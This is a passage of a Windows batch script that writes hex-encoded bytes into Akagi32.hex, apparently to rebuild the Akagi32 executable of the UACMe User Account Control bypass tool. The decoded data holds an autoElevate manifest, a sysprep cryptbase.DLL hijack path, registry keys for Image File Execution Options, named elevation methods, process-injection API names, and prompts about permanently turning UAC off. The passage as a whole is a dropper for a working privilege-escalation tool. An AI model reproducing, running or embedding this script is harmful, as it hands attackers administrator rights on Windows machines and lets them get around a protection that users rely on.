echo 66 61 6c 73 65 22 0d 0a 20 20 20 20 20 20 20 20 20 20 20 20 2f 3e 0d 0a 20 20 20 20 20 20 3c 2f 72 65 71 75 65 73 74 65 64 50 72 69 76 69 6c 65 67 65 73 3e 0d 0a 20 20 20 20 3c 2f 73 65 63 75 72 69 74 79 3e 0d 0a 20 20 3c 2f 74 72 75 73 74 49 6e 66 6f 3e 0d 0a 20 20 3c 61 73 6d 76 33 3a 61 70 70 6c 69 63 61 74 69 6f 6e 3e 0d 0a 20 20 20 20 3c 61 73 6d 76 33 3a 77 69 6e 64 6f 77 73>>Akagi32.hex
echo e 8900>>Akagi32.hex
echo 53 65 74 74 69 6e 67 73 20 78 6d 6c 6e 73 3d 22 68 74 74 70 3a 2f 2f 73 63 68 65 6d 61 73 2e 6d 69 63 72 6f 73 6f 66 74 2e 63 6f 6d 2f 53 4d 49 2f 32 30 30 35 2f 57 69 6e 64 6f 77 73 53 65 74 74 69 6e 67 73 22 3e 0d 0a 20 20 20 20 20 20 3c 61 75 74 6f 45 6c 65 76 61 74 65 3e 74 72 75 65 3c 2f 61 75 74 6f 45 6c 65 76 61 74 65 3e 0d 0a 20 20 20 20 3c 2f 61 73 6d 76 33 3a 77 69 6e 64>>Akagi32.hex
echo e 8980>>Akagi32.hex
echo 6f 77 73 53 65 74 74 69 6e 67 73 3e 0d 0a 20 20 3c 2f 61 73 6d 76 33 3a 61 70 70 6c 69 63 61 74 69 6f 6e 3e 0d 0a 20 3c 21 2d 2d 0d 0a 20 20 20 20 20 20 59 6f 75 72 20 22 64 65 66 65 6e 63 65 2d 69 6e 2d 64 65 70 74 68 20 61 70 70 72 6f 61 63 68 22 20 69 73 20 61 63 74 75 61 6c 6c 79 20 79 65 74 20 61 6e 6f 74 68 65 72 0d 0a 20 20 20 20 20 20 75 6e 64 6f 63 75 6d 65 6e 74 65 64 20>>Akagi32.hex
echo e 8a00>>Akagi32.hex
echo 62 61 63 6b 64 6f 6f 72 2e 20 49 20 73 69 6e 63 65 72 65 6c 79 20 68 6f 70 65 20 79 6f 75 20 77 69 6c 6c 20 6e 65 76 65 72 0d 0a 20 20 20 20 20 20 64 6f 20 61 6e 79 74 68 69 6e 67 20 6d 6f 72 65 20 63 6f 6d 70 6c 65 78 20 74 68 61 6e 20 63 6f 64 69 6e 67 20 54 65 74 72 69 73 2e 0d 0a 20 20 2d 2d 3e 0d 0a 20 20 3c 66 69 6c 65 0d 0a 20 20 20 20 20 20 6c 6f 61 64 46 72 6f 6d 3d 22 25>>Akagi32.hex
echo e 8a80>>Akagi32.hex
echo 73 79 73 74 65 6d 72 6f 6f 74 25 5c 73 79 73 74 65 6d 33 32 5c 73 79 73 70 72 65 70 5c 63 72 79 70 74 62 61 73 65 2e 44 4c 4c 22 0d 0a 20 20 20 20 20 20 6e 61 6d 65 3d 22 63 72 79 70 74 62 61 73 65 2e 44 4c 4c 22 0d 0a 20 20 20 20 20 20 2f 3e 0d 0a 20 3c 2f 61 73 73 65 6d 62 6c 79 3e 00 3c 3f 78 6d 6c 20 76 65 72 73 69 6f 6e 3d 22 31 2e 30 22 20 65 6e 63 6f 64 69 6e 67 3d 22 75 74>>Akagi32.hex
echo e 8b00>>Akagi32.hex
echo 66 2d 38 22 3f 3e 0d 0a 3c 75 6e 61 74 74 65 6e 64 20 78 6d 6c 6e 73 3d 22 75 72 6e 3a 73 63 68 65 6d 61 73 2d 6d 69 63 72 6f 73 6f 66 74 2d 63 6f 6d 3a 75 6e 61 74 74 65 6e 64 22 3e 0d 0a 20 20 20 20 3c 73 65 72 76 69 63 69 6e 67 3e 0d 0a 20 20 20 20 20 20 20 20 3c 70 61 63 6b 61 67 65 20 61 63 74 69 6f 6e 3d 22 69 6e 73 74 61 6c 6c 22 3e 0d 0a 20 20 20 20 20 20 20 20 20 20 20 20>>Akagi32.hex
echo e 8b80>>Akagi32.hex
echo 3c 61 73 73 65 6d 62 6c 79 49 64 65 6e 74 69 74 79 20 20 6e 61 6d 65 3d 22 50 61 63 6b 61 67 65 5f 31 5f 66 6f 72 5f 4b 42 39 32 39 37 36 31 22 20 76 65 72 73 69 6f 6e 3d 22 36 2e 30 2e 31 2e 31 22 20 6c 61 6e 67 75 61 67 65 3d 22 6e 65 75 74 72 61 6c 22 20 70 72 6f 63 65 73 73 6f 72 41 72 63 68 69 74 65 63 74 75 72 65 3d 22 78 38 36 22 20 70 75 62 6c 69 63 4b 65 79 54 6f 6b 65 6e>>Akagi32.hex
echo e 8c00>>Akagi32.hex
echo 3d 22 33 31 62 66 33 38 35 36 61 64 33 36 34 65 33 35 22 2f 3e 0d 0a 20 20 20 20 20 20 20 20 20 20 20 20 3c 73 6f 75 72 63 65 20 6c 6f 63 61 74 69 6f 6e 3d 22 25 63 6f 6e 66 69 67 73 65 74 72 6f 6f 74 25 5c 57 69 6e 64 6f 77 73 36 2e 30 2d 4b 42 39 32 39 37 36 31 2d 78 38 36 2e 43 41 42 22 20 2f 3e 0d 0a 20 20 20 20 20 20 20 20 3c 2f 70 61 63 6b 61 67 65 3e 0d 0a 20 20 20 20 20 3c>>Akagi32.hex
echo e 8c80>>Akagi32.hex
echo 2f 73 65 72 76 69 63 69 6e 67 3e 0d 0a 3c 2f 75 6e 61 74 74 65 6e 64 3e 0d 0a 0d 0a 00 00 00 00 3b 20 36 31 38 38 33 2e 49 4e 46 0d 0a 3b 20 43 6f 70 79 72 69 67 68 74 20 28 63 29 20 4d 69 63 72 6f 73 6f 66 74 20 43 6f 72 70 6f 72 61 74 69 6f 6e 2e 20 20 41 6c 6c 20 72 69 67 68 74 73 20 72 65 73 65 72 76 65 64 2e 0d 0a 0d 0a 5b 56 65 72 73 69 6f 6e 5d 0d 0a 53 69 67 6e 61 74 75 72>>Akagi32.hex
echo e 8d00>>Akagi32.hex
echo 65 3d 22 24 43 48 49 43 41 47 4f 24 22 0d 0a 43 6c 61 73 73 3d 36 31 38 38 33 0d 0a 43 6c 61 73 73 47 75 69 64 3d 7b 37 45 42 45 46 42 43 30 2d 33 32 30 30 2d 31 31 44 32 2d 42 34 43 32 2d 30 30 41 30 43 39 36 39 37 44 30 37 7d 0d 0a 50 72 6f 76 69 64 65 72 3d 25 4d 73 66 74 25 0d 0a 44 72 69 76 65 72 56 65 72 3d 31 36 2f 32 31 2f 32 30 30 36 2c 36 2e 31 2e 37 36 30 30 2e 31 36 33>>Akagi32.hex
echo e 8d80>>Akagi32.hex
echo 38 35 0d 0a 0d 0a 5b 44 65 73 74 69 6e 61 74 69 6f 6e 44 69 72 73 5d 0d 0a 44 65 66 61 75 6c 74 44 65 73 74 44 69 72 20 3d 20 31 31 0d 0a 0d 0a 5b 44 65 66 61 75 6c 74 49 6e 73 74 61 6c 6c 5d 0d 0a 43 6f 70 79 46 69 6c 65 73 3d 40 6e 74 77 64 62 6c 69 62 2e 64 6c 6c 0d 0a 0d 0a 0d 0a 00 48 00 69 00 62 00 69 00 6b 00 69 00 2e 00 64 00 6c 00 6c 00 00 00 00 00 44 00 3a 00 28 00 41 00>>Akagi32.hex
echo e 8e00>>Akagi32.hex
echo 3b 00 3b 00 47 00 41 00 3b 00 3b 00 3b 00 57 00 44 00 29 00 00 00 00 00 4d 00 41 00 43 00 48 00 49 00 4e 00 45 00 5c 00 53 00 4f 00 46 00 54 00 57 00 41 00 52 00 45 00 5c 00 4d 00 69 00 63 00 72 00 6f 00 73 00 6f 00 66 00 74 00 5c 00 57 00 69 00 6e 00 64 00 6f 00 77 00 73 00 20 00 4e 00 54 00 5c 00 43 00 75 00 72 00 72 00 65 00 6e 00 74 00 56 00 65 00 72 00 73 00 69 00 6f 00 6e 00>>Akagi32.hex
echo e 8e80>>Akagi32.hex
echo 5c 00 49 00 6d 00 61 00 67 00 65 00 20 00 46 00 69 00 6c 00 65 00 20 00 45 00 78 00 65 00 63 00 75 00 74 00 69 00 6f 00 6e 00 20 00 4f 00 70 00 74 00 69 00 6f 00 6e 00 73 00 00 00 5c 00 52 00 45 00 47 00 49 00 53 00 54 00 52 00 59 00 5c 00 00 00 00 00 47 00 6c 00 6f 00 62 00 61 00 6c 00 46 00 6c 00 61 00 67 00 00 00 00 00 56 00 65 00 72 00 69 00 66 00 69 00 65 00 72 00 44 00 6c 00>>Akagi32.hex
echo e 8f00>>Akagi32.hex
echo 6c 00 73 00 00 00 00 00 77 00 69 00 6e 00 73 00 61 00 74 00 2e 00 65 00 78 00 65 00 00 00 00 00 75 00 63 00 6d 00 57 00 69 00 6e 00 53 00 41 00 54 00 4d 00 65 00 74 00 68 00 6f 00 64 00 00 00 73 00 79 00 73 00 70 00 72 00 65 00 70 00 5c 00 00 00 00 00 77 00 62 00 65 00 6d 00 5c 00 00 00 75 00 63 00 6d 00 4d 00 4d 00 43 00 4d 00 65 00 74 00 68 00 6f 00 64 00 00 00 00 00 72 00 73 00>>Akagi32.hex
echo e 8f80>>Akagi32.hex
echo 6f 00 70 00 2e 00 6d 00 73 00 63 00 00 00 00 00 65 00 76 00 65 00 6e 00 74 00 76 00 77 00 72 00 2e 00 6d 00 73 00 63 00 00 00 00 00 6d 00 6d 00 63 00 2e 00 65 00 78 00 65 00 00 00 43 6f 70 79 46 69 6c 65 57 00 00 00 43 72 65 61 74 65 52 65 6d 6f 74 65 54 68 72 65 61 64 00 00 57 61 69 74 46 6f 72 53 69 6e 67 6c 65 4f 62 6a 65 63 74 00 57 72 69 74 65 50 72 6f 63 65 73 73 4d 65 6d 6f>>Akagi32.hex
echo e 9000>>Akagi32.hex
echo 72 79 00 00 4e 74 43 6c 6f 73 65 00 6e 00 74 00 64 00 6c 00 6c 00 2e 00 64 00 6c 00 6c 00 00 00 4e 74 41 6c 6c 6f 63 61 74 65 56 69 72 74 75 61 6c 4d 65 6d 6f 72 79 00 4e 74 54 65 72 6d 69 6e 61 74 65 50 72 6f 63 65 73 73 00 00 6e 00 65 00 74 00 75 00 74 00 69 00 6c 00 73 00 2e 00 64 00 6c 00 6c 00 00 00 00 00 63 00 72 00 65 00 64 00 77 00 69 00 7a 00 2e 00 65 00 78 00 65 00 00 00>>Akagi32.hex
echo e 9080>>Akagi32.hex
echo 6f 00 6f 00 62 00 65 00 2e 00 65 00 78 00 65 00 00 00 00 00 53 68 65 6c 6c 45 78 65 63 75 74 65 45 78 57 00 72 00 75 00 6e 00 61 00 73 00 00 00 69 00 6e 00 65 00 74 00 73 00 72 00 76 00 5c 00 00 00 00 00 49 00 6e 00 65 00 74 00 4d 00 67 00 72 00 2e 00 65 00 78 00 65 00 00 00 75 00 63 00 6d 00 47 00 57 00 58 00 00 00 00 00 4b 00 6f 00 6e 00 67 00 6f 00 75 00 33 00 32 00 2e 00 63 00>>Akagi32.hex
echo e 9100>>Akagi32.hex
echo 64 00 00 00 53 00 4c 00 43 00 2e 00 64 00 6c 00 6c 00 00 00 63 00 72 00 79 00 70 00 74 00 62 00 61 00 73 00 65 00 2e 00 64 00 6c 00 6c 00 00 00 74 00 61 00 73 00 6b 00 68 00 6f 00 73 00 74 00 2e 00 65 00 78 00 65 00 00 00 00 00 75 00 63 00 6d 00 41 00 75 00 74 00 6f 00 45 00 6c 00 65 00 76 00 61 00 74 00 65 00 4d 00 61 00 6e 00 69 00 66 00 65 00 73 00 74 00 57 00 37 00 00 00 00 00>>Akagi32.hex
echo e 9180>>Akagi32.hex
echo 5c 00 00 00 2e 00 6d 00 61 00 6e 00 69 00 66 00 65 00 73 00 74 00 00 00 74 00 7a 00 73 00 79 00 6e 00 63 00 2e 00 65 00 78 00 65 00 00 00 00 00 75 00 63 00 6d 00 41 00 75 00 74 00 6f 00 45 00 6c 00 65 00 76 00 61 00 74 00 65 00 4d 00 61 00 6e 00 69 00 66 00 65 00 73 00 74 00 00 00 00 00 4d 00 53 00 43 00 4f 00 52 00 45 00 45 00 2e 00 44 00 4c 00 4c 00 00 00 75 00 63 00 6d 00 49 00>>Akagi32.hex
echo e 9200>>Akagi32.hex
echo 6e 00 65 00 74 00 4d 00 67 00 72 00 4d 00 65 00 74 00 68 00 6f 00 64 00 00 00 00 00 5c 00 77 00 69 00 6e 00 73 00 78 00 73 00 5c 00 00 00 00 00 6d 00 69 00 63 00 72 00 6f 00 73 00 6f 00 66 00 74 00 2d 00 77 00 69 00 6e 00 64 00 6f 00 77 00 73 00 2d 00 69 00 69 00 73 00 2d 00 6d 00 61 00 6e 00 61 00 67 00 65 00 6d 00 65 00 6e 00 74 00 63 00 6f 00 6e 00 73 00 6f 00 6c 00 65 00 00 00>>Akagi32.hex
echo e 9280>>Akagi32.hex
echo 2a 00 2e 00 65 00 78 00 65 00 00 00 5c 00 52 00 70 00 63 00 20 00 43 00 6f 00 6e 00 74 00 72 00 6f 00 6c 00 5c 00 41 00 6b 00 61 00 67 00 69 00 00 00 00 00 63 00 6f 00 6d 00 63 00 74 00 6c 00 33 00 32 00 2e 00 64 00 6c 00 6c 00 00 00 00 00 6d 00 69 00 63 00 72 00 6f 00 73 00 6f 00 66 00 74 00 2e 00 77 00 69 00 6e 00 64 00 6f 00 77 00 73 00 2e 00 63 00 6f 00 6d 00 6d 00 6f 00 6e 00>>Akagi32.hex
echo e 9300>>Akagi32.hex
echo 2d 00 63 00 6f 00 6e 00 74 00 72 00 6f 00 6c 00 73 00 00 00 2e 00 68 00 61 00 77 00 61 00 77 00 61 00 00 00 2e 00 6c 00 6f 00 63 00 61 00 6c 00 00 00 00 00 64 00 69 00 73 00 6d 00 63 00 6f 00 72 00 65 00 2e 00 64 00 6c 00 6c 00 00 00 00 00 65 00 6c 00 6c 00 6f 00 63 00 6e 00 61 00 6b 00 2e 00 78 00 6d 00 6c 00 00 00 00 00 70 00 6b 00 67 00 6d 00 67 00 72 00 2e 00 65 00 78 00 65 00>>Akagi32.hex
echo e 9380>>Akagi32.hex
echo 00 00 00 00 2f 00 6e 00 3a 00 25 00 74 00 65 00 6d 00 70 00 25 00 5c 00 65 00 6c 00 6c 00 6f 00 63 00 6e 00 61 00 6b 00 2e 00 78 00 6d 00 6c 00 00 00 00 00 00 00 00 00 57 00 6f 00 77 00 36 00 34 00 20 00 64 00 65 00 74 00 65 00 63 00 74 00 65 00 64 00 2c 00 20 00 75 00 73 00 65 00 20 00 78 00 36 00 34 00 20 00 76 00 65 00 72 00 73 00 69 00 6f 00 6e 00 20 00 6f 00 66 00 20 00 74 00>>Akagi32.hex
echo e 9400>>Akagi32.hex
echo 68 00 69 00 73 00 20 00 74 00 6f 00 6f 00 6c 00 2e 00 00 00 43 00 75 00 72 00 72 00 65 00 6e 00 74 00 20 00 57 00 69 00 6e 00 64 00 6f 00 77 00 73 00 20 00 42 00 75 00 69 00 6c 00 64 00 3a 00 20 00 00 00 00 00 00 00 0a 00 4d 00 69 00 6e 00 69 00 6d 00 75 00 6d 00 20 00 57 00 69 00 6e 00 64 00 6f 00 77 00 73 00 20 00 42 00 75 00 69 00 6c 00 64 00 20 00 52 00 65 00 71 00 75 00 69 00>>Akagi32.hex
echo e 9480>>Akagi32.hex
echo 72 00 65 00 64 00 3a 00 20 00 00 00 0a 00 41 00 62 00 6f 00 72 00 74 00 69 00 6e 00 67 00 20 00 65 00 78 00 65 00 63 00 75 00 74 00 69 00 6f 00 6e 00 2e 00 00 00 00 00 54 00 68 00 69 00 73 00 20 00 6d 00 65 00 74 00 68 00 6f 00 64 00 20 00 66 00 69 00 78 00 65 00 64 00 2f 00 75 00 6e 00 61 00 76 00 61 00 69 00 6c 00 61 00 62 00 6c 00 65 00 20 00 69 00 6e 00 20 00 74 00 68 00 65 00>>Akagi32.hex
echo e 9500>>Akagi32.hex
echo 20 00 63 00 75 00 72 00 72 00 65 00 6e 00 74 00 20 00 76 00 65 00 72 00 73 00 69 00 6f 00 6e 00 20 00 6f 00 66 00 20 00 57 00 69 00 6e 00 64 00 6f 00 77 00 73 00 2c 00 20 00 64 00 6f 00 20 00 79 00 6f 00 75 00 20 00 73 00 74 00 69 00 6c 00 6c 00 20 00 77 00 61 00 6e 00 74 00 20 00 74 00 6f 00 20 00 63 00 6f 00 6e 00 74 00 69 00 6e 00 75 00 65 00 3f 00 00 00 54 00 68 00 69 00 73 00>>Akagi32.hex
echo e 9580>>Akagi32.hex
echo 20 00 6d 00 65 00 74 00 68 00 6f 00 64 00 20 00 77 00 69 00 6c 00 6c 00 20 00 70 00 65 00 72 00 6d 00 61 00 6e 00 65 00 6e 00 74 00 6c 00 79 00 20 00 54 00 55 00 52 00 4e 00 20 00 55 00 41 00 43 00 20 00 4f 00 46 00 46 00 2c 00 20 00 61 00 72 00 65 00 20 00 79 00 6f 00 75 00 20 00 73 00 75 00 72 00 65 00 3f 00 00 00 00 00 70 00 6f 00 77 00 72 00 70 00 72 00 6f 00 66 00 2e 00 64 00>>Akagi32.hex
echo e 9600>>Akagi32.hex
echo 6c 00 6c 00 00 00 00 00 64 00 65 00 76 00 6f 00 62 00 6a 00 2e 00 64 00 6c 00 6c 00 00 00 00 00 77 00 62 00 65 00 6d 00 63 00 6f 00 6d 00 6e 00 2e 00 64 00 6c 00 6c 00 00 00 00 00 73 00 79 00 73 00 70 00 72 00 65 00 70 00 2e 00 65 00 78 00 65 00 00 00 00 00 00 00 57 00 41 00 52 00 4e 00 49 00 4e 00 47 00 3a 00 20 00 54 00 68 00 69 00 73 00 20 00 6d 00 65 00 74 00 68 00 6f 00 64 00>>Akagi32.hex
echo e 9680>>Akagi32.hex
echo 20 00 77 00 69 00 6c 00 6c 00 20 00 61 00 66 00 66 00 65 00 63 00 74 00 20 00 55 00 41 00 43 00 20 00 69 00 6e 00 74 00 65 00 72 00 66 00 61 00 63 00 65 00 2c 00 20 00 61 00 72 00 65 00 20 00 79 00 6f 00 75 00 20 00 73 00 75 00 72 00 65 00 3f 00 00 00 63 00 6f 00 6e 00 73 00 65 00 6e 00 74 00 2e 00 65 00 78 00 65 00 00 00 65 00 76 00 65 00 6e 00 74 00 76 00 77 00 72 00 2e 00 65 00>>Akagi32.hex
echo e 9700>>Akagi32.hex
echo 78 00 65 00 00 00 00 00 43 00 6f 00 6d 00 70 00 4d 00 67 00 6d 00 74 00 4c 00 61 00 75 00 6e 00 63 00 68 00 65 00 72 00 2e 00 65 00 78 00 65 00 00 00 00 00 63 00 6f 00 6e 00 74 00 72 00 6f 00 6c 00 2e 00 65 00 78 00 65 00 00 00 00 00 00 00 7b 00 33 00 41 00 44 00 30 00 35 00 35 00 37 00 35 00 2d 00 38 00 38 00 35 00 37 00 2d 00 34 00 38 00 35 00 30 00 2d 00 39 00 32 00 37 00 37 00>>Akagi32.hex
echo e 9780>>Akagi32.hex
echo 2d 00 31 00 31 00 42 00 38 00 35 00 42 00 44 00 42 00 38 00 45 00 30 00 39 00 7d 00 00 00 00 00 75 00 6e 00 62 00 63 00 6c 00 2e 00 64 00 6c 00 6c 00 00 00 73 00 68 00 63 00 6f 00 72 00 65 00 2e 00 64 00 6c 00 6c 00 00 00 00 00 64 00 62 00 67 00 63 00 6f 00 72 00 65 00 2e 00 64 00 6c 00 6c 00 00 00 6f 00 6f 00 62 00 65 00 5c 00 00 00 6f 00 6f 00 62 00 65 00 5c 00 73 00 65 00 74 00>>Akagi32.hex
echo e 9800>>Akagi32.hex
echo 75 00 70 00 73 00 71 00 6d 00 2e 00 65 00 78 00 65 00 00 00 41 00 63 00 74 00 69 00 6f 00 6e 00 51 00 75 00 65 00 75 00 65 00 2e 00 64 00 6c 00 6c 00 00 00 45 00 6c 00 65 00 76 00 61 00 74 00 69 00 6f 00 6e 00 3a 00 41 00 64 00 6d 00 69 00 6e 00 69 00 73 00 74 00 72 00 61 00 74 00 6f 00 72 00 21 00 6e 00 65 00 77 00 3a 00 00 00 00 00 65 00 6c 00 6c 00 6f 00 63 00 6e 00 61 00 6b 00>>Akagi32.hex
echo e 9880>>Akagi32.hex
echo 2e 00 69 00 6e 00 66 00 00 00 00 00 49 00 6e 00 66 00 44 00 65 00 66 00 61 00 75 00 6c 00 74 00 49 00 6e 00 73 00 74 00 61 00 6c 00 6c 00 2e 00 65 00 78 00 65 00 00 00 7b 00 34 00 44 00 31 00 31 00 31 00 45 00 30 00 38 00 2d 00 43 00 42 00 46 00 37 00 2d 00 34 00 66 00 31 00 32 00 2d 00 41 00 39 00 32 00 36 00 2d 00 32 00 43 00 37 00 39 00 32 00 30 00 41 00 46 00 35 00 32 00 46 00>>Akagi32.hex
echo e 9900>>Akagi32.hex
echo 43 00 7d 00 00 00 00 00 7b 00 31 00 34 00 42 00 32 00 43 00 36 00 31 00 39 00 2d 00 44 00 30 00 37 00 41 00 2d 00 34 00 36 00 45 00 46 00 2d 00 38 00 42 00 36 00 32 00 2d 00 33 00 31 00 42 00 36 00 34 00 46 00 33 00 42 00 38 00 34 00 35 00 43 00 7d 00 00 00 00 00 4d 00 41 00 43 00 48 00 49 00 4e 00 45 00 5c 00 53 00 4f 00 46 00 54 00 57 00 41 00 52 00 45 00 5c 00 4d 00 69 00 63 00>>Akagi32.hex
echo e 9980>>Akagi32.hex
echo 72 00 6f 00 73 00 6f 00 66 00 74 00 5c 00 57 00 69 00 6e 00 64 00 6f 00 77 00 73 00 5c 00 43 00 75 00 72 00 72 00 65 00 6e 00 74 00 56 00 65 00 72 00 73 00 69 00 6f 00 6e 00 5c 00 70 00 6f 00 6c 00 69 00 63 00 69 00 65 00 73 00 5c 00 73 00 79 00 73 00 74 00 65 00 6d 00 00 00 45 00 6e 00 61 00 62 00 6c 00 65 00 4c 00 55 00 41 00 00 00 43 00 72 00 65 00 61 00 74 00 65 00 46 00 69 00>>Akagi32.hex
echo e 9a00>>Akagi32.hex
echo 6c 00 65 00 00 00 00 00 5b 00 55 00 43 00 4d 00 5d 00 20 00 00 00 00 00 20 00 63 00 6f 00 64 00 65 00 20 00 3d 00 20 00 00 00 00 00 0a 00 00 00 4f 00 70 00 65 00 6e 00 44 00 69 00 72 00 65 00 63 00 74 00 6f 00 72 00 79 00 00 00 53 00 6f 00 66 00 74 00 77 00 61 00 72 00 65 00 5c 00 41 00 6b 00 61 00 67 00 69 00 00 00 00 00 46 00 6c 00 61 00 67 00 00 00 00 00 4c 00 6f 00 76 00 65 00>>Akagi32.hex
echo e 9a80>>Akagi32.hex
echo 4c 00 65 00 74 00 74 00 65 00 72 00 00 00 00 00 55 00 41 00 43 00 4d 00 65 00 00 00 65 00 78 00 70 00 6c 00 6f 00 72 00 65 00 72 00 2e 00 65 00 78 00 65 00 00 00 00 00 4e 00 6f 00 74 00 20 00 61 00 20 00 73 00 65 00 63 00 75 00 72 00 69 00 74 00 79 00 20 00 62 00 6f 00 75 00 6e 00 64 00 61 00 72 00 79 00 21 00 20 00 4a 00 75 00 73 00 74 00 20 00 68 00 61 00 63 00 6b 00 2d 00 6f 00>>Akagi32.hex
echo e 9b00>>Akagi32.hex
echo 2d 00 72 00 61 00 6d 00 61 00 2e 00 20 00 4b 00 65 00 65 00 70 00 20 00 69 00 74 00 20 00 61 00 73 00 20 00 69 00 73 00 21 00 00 00 e8 d4 40 00 38 d5 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ab 28 08 59 00 00 00 00 0d 00 00 00 3c 01 00 00 f0 b2 00 00 f0 9a 00 00 00 00 00 00 ab 28 08 59 00 00 00 00 0e 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 5c 00 00 00 00 00 00 00>>Akagi32.hex
echo e 9b80>>Akagi32.hex
echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 28 d4 40 00 e0 b2 40 00 04 00 00 00 b4 92 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 70 00 00 90 77 00 00 20 7d 00 00 20 7f 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e 9c00>>Akagi32.hex
echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e 9c80>>Akagi32.hex
echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e 9d00>>Akagi32.hex
echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ff ff ff ff 56 21 40 00 5a 21 40 00 00 00 00 00 fe ff ff ff 00 00 00 00 a8 ff ff ff 00 00 00 00 fe ff ff ff 5b 7b 40 00 6e 7b 40 00 00 00 00 00 fe ff ff ff 00 00 00 00 d8 ff ff ff 00 00 00 00 fe ff ff ff d9 80 40 00 ec 80 40 00 04 b6 00 00>>Akagi32.hex
echo e 9d80>>Akagi32.hex
echo 00 00 00 00 00 00 00 00 18 bb 00 00 84 90 00 00 04 b7 00 00 00 00 00 00 00 00 00 00 02 bc 00 00 84 91 00 00 f4 b5 00 00 00 00 00 00 00 00 00 00 42 bc 00 00 74 90 00 00 80 b5 00 00 00 00 00 00 00 00 00 00 ea bc 00 00 00 90 00 00 f8 b6 00 00 00 00 00 00 00 00 00 00 28 bd 00 00 78 91 00 00 14 b8 00 00 00 00 00 00 00 00 00 00 aa bd 00 00 94 92 00 00 4c b7 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e 9e00>>Akagi32.hex
echo d8 c1 00 00 cc 91 00 00 a8 b5 00 00 00 00 00 00 00 00 00 00 c4 c2 00 00 28 90 00 00 c4 b6 00 00 00 00 00 00 00 00 00 00 7e c3 00 00 44 91 00 00 d8 b5 00 00 00 00 00 00 00 00 00 00 8c c3 00 00 58 90 00 00 e0 b5 00 00 00 00 00 00 00 00 00 00 9a c3 00 00 60 90 00 00 3c b7 00 00 00 00 00 00 00 00 00 00 d0 c3 00 00 bc 91 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e 9e80>>Akagi32.hex
echo d2 bc 00 00 5a bc 00 00 6c bc 00 00 7e bc 00 00 8c bc 00 00 a0 bc 00 00 b2 bc 00 00 c2 bc 00 00 4c bc 00 00 00 00 00 00 72 c2 00 00 60 c2 00 00 48 c2 00 00 36 c2 00 00 1e c2 00 00 0a c2 00 00 e2 c1 00 00 86 c2 00 00 9a c2 00 00 b0 c2 00 00 f6 c1 00 00 00 00 00 00 11 00 00 80 00 00 00 00 0d 00 00 80 0e 00 00 80 0b 00 00 80 0a 00 00 80 00 00 00 00 2e bc 00 00 20 bc 00 00 0e bc 00 00>>Akagi32.hex
echo e 9f00>>Akagi32.hex
echo 00 00 00 00 70 ba 00 00 7c ba 00 00 92 ba 00 00 a2 ba 00 00 b8 ba 00 00 ca ba 00 00 ac b9 00 00 f8 ba 00 00 68 ba 00 00 30 c4 00 00 14 c4 00 00 f8 c3 00 00 e8 c3 00 00 56 ba 00 00 48 ba 00 00 3c ba 00 00 c2 b9 00 00 2c ba 00 00 1c ba 00 00 0a ba 00 00 9a b9 00 00 8a b9 00 00 72 b9 00 00 fa b9 00 00 e4 b9 00 00 d0 b9 00 00 06 bb 00 00 5e b9 00 00 48 b9 00 00 2e b9 00 00 20 b9 00 00>>Akagi32.hex
echo e 9f80>>Akagi32.hex
echo 12 b9 00 00 04 b9 00 00 f4 b8 00 00 d6 b8 00 00 c4 b8 00 00 b8 b8 00 00 ac b8 00 00 9c b8 00 00 88 b8 00 00 7a b8 00 00 6a b8 00 00 5a b8 00 00 46 b8 00 00 e0 ba 00 00 34 b8 00 00 4e c4 00 00 00 00 00 00 0e c3 00 00 d0 c2 00 00 dc c2 00 00 e6 c2 00 00 ee c2 00 00 fe c2 00 00 1e c3 00 00 32 c3 00 00 44 c3 00 00 6e c3 00 00 5c c3 00 00 4e c3 00 00 00 00 00 00 f8 bc 00 00 0a bd 00 00>>Akagi32.hex
echo e a000>>Akagi32.hex
echo 00 00 00 00 34 bb 00 00 26 bb 00 00 a6 bb 00 00 96 bb 00 00 b8 bb 00 00 6e bb 00 00 e0 bb 00 00 f4 bb 00 00 c0 bb 00 00 82 bb 00 00 d2 bb 00 00 46 bb 00 00 5a bb 00 00 00 00 00 00 c0 c3 00 00 b4 c3 00 00 a6 c3 00 00 00 00 00 00 8a c0 00 00 9c c0 00 00 b8 c0 00 00 cc c0 00 00 da c0 00 00 f4 c0 00 00 08 c1 00 00 78 c0 00 00 3c c1 00 00 4a c1 00 00 5a c1 00 00 74 c1 00 00 0c be 00 00>>Akagi32.hex
echo e a080>>Akagi32.hex
